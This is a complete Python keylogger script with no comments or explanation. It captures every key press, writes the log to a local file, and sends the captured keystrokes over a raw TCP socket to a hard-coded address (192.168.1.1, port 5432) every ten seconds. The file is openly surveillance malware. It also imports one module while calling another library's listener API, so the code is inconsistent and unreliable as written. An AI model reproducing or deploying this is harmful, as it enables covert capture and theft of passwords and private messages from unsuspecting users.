import keyboard
import socket
import os
import threading
class Keylogger:
    def __init__(self):
        self.log = ""
    def append_to_log(self, string):
        self.log += string
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        print(f"Key pressed: {current_key}")
        self.append_to_log(current_key)
    def report(self):
        with open("temp_logs.dat", "w") as f:
            f.write(self.log)
        print("Log file updated")
        self.send_data()
        self.log = ""
        timer = threading.Timer(10, self.report)
        timer.start()
    def send_data(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.1.1", 5432))
            s.send(self.log.encode())
            print("Data sent to server")
            s.close()
        except Exception as e:
            print(f"Failed to send data: {e}")
    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()